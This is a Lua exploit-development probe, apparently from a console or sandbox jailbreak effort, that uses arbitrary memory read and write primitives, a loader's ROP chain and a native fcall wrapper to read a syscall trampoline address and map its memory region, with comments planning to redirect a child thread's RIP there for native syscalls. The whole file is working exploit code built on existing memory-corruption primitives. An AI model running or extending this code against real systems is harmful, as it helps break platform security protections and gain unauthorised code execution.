-- CRASH_CLASS: LOW
-- PROBE 712b: what the loader's fcall stub actually is.
--
-- Context: tostring(syscall.pipe) prints the loader's own ROP chain. In 712a the
-- chain ended with `pop rsp; ret` followed by the value 0x310C49FD0, which is
-- exactly fcall_stub.fn_addr. That means fn_addr is a heap address whose first
-- qword is the next return target - the actual syscall trampoline, which must be
-- executable code somewhere.
--
-- If we can read that trampoline address, a thr_create child can set RIP to it
-- and issue a syscall natively. This probe only reads; nothing is executed past
-- the control call.
--
-- Note from 712a: pass syscall.pipe.fn_addr as the userdata it is. Converting it
-- to a Lua number first and handing that to native.fcall_with_rax killed the
-- process.

print("=== PROBE 712b: fcall stub contents ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function q(v) return string.format("0x%X", to_num(v)) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] fn_addr=" .. q(fn))
local ok, pid = pcall(function() return native.fcall_with_rax(fn_ud, 20) end)
print("[A] control fcall_with_rax(getpid) ok=" .. tostring(ok) .. " -> " .. tostring(ok and to_num(pid) or "EXC"))

print("[B] qwords at fn_addr:")
for off=0,0x50,8 do
    local v = rq(fn+off)
    print(string.format("    +%02X = %s", off, v and string.format("0x%X",v) or "??"))
end

-- find which region the first qword lives in
local cand = rq(fn)
print("[C] candidate trampoline=" .. (cand and string.format("0x%X",cand) or "nil"))
if cand then
    local map = memory.alloc(0x2000)
    local cnt = memory.alloc(8)
    wd(cnt,0)
    local sc674 = (function() local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=674 setmetatable(t,getmetatable(syscall.pipe)) return t end)()
    local okm, rvm = pcall(function() return sc674(uint64(string.format("0x%X",to_num(map))), uint64(72), uint64(64), uint64(string.format("0x%X",to_num(cnt))), uint64(0x40000000), uint64(0)) end)
    local got = to_num(rd(cnt) or 0)
    print(string.format("[C] 674 ok=%s rv=%s count=%d", tostring(okm), tostring(rvm), got))
    for i=0,math.max(got,1)-1 do
        local base = to_num(map)+i*72
        local lo = rd(base) or 0
        local hi = rd(base+4) or 0
        local start = hi*4294967296+lo
        lo = rd(base+8) or 0
        hi = rd(base+0x0C) or 0
        local fin = hi*4294967296+lo
        if cand >= start and cand < fin then
            print(string.format("    region %X-%X prot=%X", start, fin, rd(base+0x18) or 0))
        end
    end
end

print("[Z] alive=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
